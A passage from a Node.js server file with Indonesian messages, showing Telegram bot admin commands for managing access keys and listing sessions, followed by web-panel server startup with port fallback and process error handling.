            VALID_KEYS.splice(index, 1);
            appBot.sendMessage(
                id,
                `✅ Key dihapus: <code>${keyToRemove}</code>`,
                { parse_mode: "HTML" },
            );
        } else {
            appBot.sendMessage(
                id,
                `❌ Key tidak ditemukan: <code>${keyToRemove}</code>`,
                { parse_mode: "HTML" },
            );
        }
    }
});

appBot.onText(/\/listkeys/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId == id) {
        let keyList = "🔑 <b>Valid Keys:</b>\n\n";
        VALID_KEYS.forEach((key, index) => {
            keyList += `${index + 1}. <code>${key}</code>\n`;
        });
        appBot.sendMessage(id, keyList, { parse_mode: "HTML" });
    }
});

appBot.onText(/\/sessions/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId == id) {
        let sessionList = "📊 <b>Active Sessions:</b>\n\n";

        // Web sessions
        if (authenticatedSessions.size > 0) {
            sessionList += "🌐 <b>Web Sessions:</b>\n";
            authenticatedSessions.forEach((session, token) => {
                const timeActive = Math.floor(
                    (Date.now() - session.createdAt) / 1000 / 60,
                );
                sessionList += `• Token: <code>${token.substring(0, 8)}...</code>\n`;
                sessionList += `  Key: <code>${session.key}</code>\n`;
                sessionList += `  Active: ${timeActive} minutes\n\n`;
            });
        }

        // Telegram sessions
        if (telegramAuthenticatedUsers.size > 0) {
            sessionList += "📱 <b>Telegram Sessions:</b>\n";
            telegramAuthenticatedUsers.forEach((user, userId) => {
                const timeActive = Math.floor(
                    (Date.now() - user.authenticatedAt) / 1000 / 60,
                );
                sessionList += `• User: @${user.username}\n`;
                sessionList += `  Key: <code>${user.key}</code>\n`;
                sessionList += `  Active: ${timeActive} minutes\n\n`;
            });
        }

        if (
            authenticatedSessions.size === 0 &&
            telegramAuthenticatedUsers.size === 0
        ) {
            sessionList = "📊 Tidak ada session aktif";
        }

        appBot.sendMessage(id, sessionList, { parse_mode: "HTML" });
    }
});

appBot.onText(/\/telegramusers/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId == id) {
        if (telegramAuthenticatedUsers.size === 0) {
            appBot.sendMessage(
                id,
                "📱 Tidak ada user Telegram yang terautentikasi",
            );
        } else {
            let userList = "📱 <b>Authenticated Telegram Users:</b>\n\n";
            telegramAuthenticatedUsers.forEach((user, userId) => {
                const timeActive = Math.floor(
                    (Date.now() - user.authenticatedAt) / 1000 / 60,
                );
                userList += `• User: @${user.username}\n`;
                userList += `  ID: <code>${userId}</code>\n`;
                userList += `  Key: <code>${user.key}</code>\n`;
                userList += `  Active: ${timeActive} minutes\n\n`;
            });
            appBot.sendMessage(id, userList, { parse_mode: "HTML" });
        }
    }
});

// Admin bot dijalankan terpisah melalui server.js
console.log('🔗 Main server ready for admin bot connection');

// Server startup with port fallback
let port = 5000;

function startServer(port) {
    appServer.listen(port, "0.0.0.0", () => {
        console.log(`✅ Server berjalan di http://0.0.0.0:${port}`);
        console.log(
            `🌐 Akses web interface: http://localhost:${port}/web-control`,
        );
        console.log(
            `📱 Panel URL untuk APK: https://your-repl-url.replit.dev:${port}/`,
        );
        console.log('🤖 Admin Bot is running alongside main server');
    });
}

appServer.on("error", (err) => {
    if (err.code === "EADDRINUSE") {
        console.warn(
            `⚠️  Port ${port} sudah digunakan. Mencoba port ${port + 1}...`,
        );
        port++;
        if (port <= 5010) {
            // Limit port attempts
            startServer(port);
        } else {
            console.error("❌ Tidak dapat menemukan port yang tersedia");
            process.exit(1);
        }
    } else {
        console.error("❌ Terjadi error saat menjalankan server:", err);
        process.exit(1);
    }
});

// Handle process termination
process.on("SIGINT", () => {
    console.log("\n🛑 Server dihentikan...");
    appServer.close(() => {
        console.log("✅ Server berhasil dihentikan");
        process.exit(0);
    });
});

process.on("uncaughtException", (error) => {
    console.error("❌ Uncaught Exception:", error);
});

process.on("unhandledRejection", (reason, promise) => {
    console.error("❌ Unhandled Rejection at:", promise, "reason:", reason);
});

startServer(port);
